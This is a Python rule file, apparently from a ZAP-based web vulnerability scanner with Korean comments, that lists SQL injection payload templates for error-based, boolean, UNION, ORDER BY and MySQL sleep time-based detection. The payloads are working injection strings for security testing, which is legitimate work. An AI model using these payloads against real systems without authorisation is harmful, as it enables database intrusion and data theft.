from __future__ import annotations

# time-based SQLi 지연 시간(초). ZAP send_request 내부 timeout을 넘기면 요청이 에러나므로 짧게 유지.
# 값 변경 시 analyzer/sqli/judge.py 의 SLEEP_THRESHOLD(= _SLEEP - 0.5 권장)도 같이 맞출 것.
_SLEEP = 3


# {value}는 파라미터 원본값 자리표시
_BOOLEAN_AND_FALSE_TEMPLATES = [
    "{value} AND 1=2 -- ",
    "{value}' AND '1'='2' -- ",
    '{value}" AND "1"="2" -- ',
    "{value} AND 1=2",
    "{value}' AND '1'='2",
    '{value}" AND "1"="2"',
    "{value}XYZABCDEFGHIJ",
    "{value}XYZABCDEFGHIJ' -- ",
    '{value}XYZABCDEFGHIJ" -- ',
]

SQLI_RULES: list[dict] = [
    {
        "attack_id": "PL-SQLI-ERROR-META",
        "vuln_type": "sqli",
        "technique": "error_meta",
        "sequence": ["baseline", "attack"],
        "payload_templates": {
            "attack": [
                "{value}'",
                '{value}"',
                "{value};",
                "{value}NULL",
                "{value}'(",
                "{value})",
                "{value}(",
                "{value}'\"",
                # canary(고유 문자열) 확인용 — extractvalue 에러 메시지에 canary가 그대로 반사되면
                # 일반 키워드 매칭과 달리 우연히 일치할 수 없는 직접 증거가 됨
                "{value}' AND extractvalue(1,concat(0x7e,'{canary}')) -- ",
                '{value}" AND extractvalue(1,concat(0x7e,\'{canary}\')) -- ',
                "{value} AND extractvalue(1,concat(0x7e,'{canary}')) -- ",
            ],
        },
    },
    {
        # AND/OR 스타일을 한 family로 통합 — 두 스타일이 false_attack(6개)과 와일드카드(3개)를
        # 완전히 동일하게 공유했던 걸 그대로 두면 family당 요청이 이중으로 나가서 하나로 합침.
        # _analyze_boolean은 true/false 방향을 이미 무관하게 처리하므로 판정 로직 변경은 불필요.
        "attack_id": "PL-SQLI-BOOLEAN",
        "vuln_type": "sqli",
        "technique": "boolean",
        "sequence": ["baseline", "true_attack", "false_attack"],
        "payload_templates": {
            "true_attack": [
                # AND 스타일 — true≈baseline, false≠baseline로 해석되길 기대
                "{value} AND 1=1 -- ",
                "{value}' AND '1'='1' -- ",
                '{value}" AND "1"="1" -- ',
                "{value} AND 1=1",
                "{value}' AND '1'='1",
                '{value}" AND "1"="1"',
                # OR 스타일 — AND로 차이가 안 보일 때 조건 범위를 넓혀 재확인 (방향 반대)
                "{value} OR 1=1 -- ",
                "{value}' OR '1'='1' -- ",
                '{value}" OR "1"="1" -- ',
                "{value} OR 1=1",
                "{value}' OR '1'='1",
                '{value}" OR "1"="1"',
                # 와일드카드 — AND/OR 스타일 둘 다에서 통했던 것이라 스타일 무관 공통 확인용으로 1벌만 유지
                "{value}%",
                "{value}%' -- ",
                '{value}%" -- ',
            ],
            "false_attack": _BOOLEAN_AND_FALSE_TEMPLATES,
        },
    },
    {
        "attack_id": "PL-SQLI-UNION",
        "vuln_type": "sqli",
        "technique": "union",
        "sequence": ["baseline", "attack"],
        "payload_templates": {
            "attack": [
                "{value} UNION ALL SELECT NULL -- ",
                "{value}' UNION ALL SELECT NULL -- ",
                '{value}" UNION ALL SELECT NULL -- ',
                "{value}) UNION ALL SELECT NULL -- ",
                "{value}') UNION ALL SELECT NULL -- ",
                '{value}") UNION ALL SELECT NULL -- ',
                # canary 확인용 — NULL 대신 고유 문자열을 SELECT해서, 그게 응답에 그대로 반사되면
                # "컬럼 수 에러 없음" 같은 간접 증거가 아니라 실제 데이터 유출이 되는 직접 증거가 됨
                "{value} UNION ALL SELECT '{canary}' -- ",
                "{value}' UNION ALL SELECT '{canary}' -- ",
                '{value}" UNION ALL SELECT \'{canary}\' -- ',
            ],
        },
    },
    {
        "attack_id": "PL-SQLI-ORDERBY",
        "vuln_type": "sqli",
        "technique": "order_by",
        "sequence": ["baseline", "attack"],
        # ORDER BY 절 주입 → 컬럼 수보다 큰 번호로 정렬 시 DB가
        # "Unknown column '100' in 'order clause'" 에러를 확정적으로 노출.
        # (ORDER BY 1 처럼 유효한 번호는 에러 없이 정렬만 되므로 반드시 큰 수)
        # 판정은 analyzer 의 judge_error_based_sqli(DB 에러 시그니처)로 낙하.
        "payload_templates": {
            "attack": [
                "{value} ORDER BY 100-- ",
                "{value}' ORDER BY 100-- ",
                '{value}" ORDER BY 100-- ',
                "{value} ORDER BY 9999-- ",
                "{value}' ORDER BY 9999-- ",
                '{value}" ORDER BY 9999-- ',
            ],
        },
    },
    {
        "attack_id": "PL-SQLI-TIME-MYSQL",
        "vuln_type": "sqli",
        "technique": "time_mysql",
        "sequence": ["baseline", "attack"],
        "payload_templates": {
            "attack": [
                f"{{value}} / sleep({_SLEEP}) ",
                f"{{value}}' / sleep({_SLEEP}) / '",
                f'{{value}}" / sleep({_SLEEP}) / "',
                f"{{value}} AND 0 IN (SELECT sleep({_SLEEP}) ) -- ",
                f"{{value}}' AND 0 IN (SELECT sleep({_SLEEP}) ) -- ",
                f'{{value}}" AND 0 IN (SELECT sleep({_SLEEP}) ) -- ',
                f"{{value}} WHERE 0 IN (SELECT sleep({_SLEEP}) ) -- ",
                f"{{value}}' WHERE 0 IN (SELECT sleep({_SLEEP}) ) -- ",
                f'{{value}}" WHERE 0 IN (SELECT sleep({_SLEEP}) ) -- ',
                f"{{value}} OR 0 IN (SELECT sleep({_SLEEP}) ) -- ",
                f"{{value}}' OR 0 IN (SELECT sleep({_SLEEP}) ) -- ",
                f'{{value}}" OR 0 IN (SELECT sleep({_SLEEP}) ) -- ',
            ],
        },
    },
]
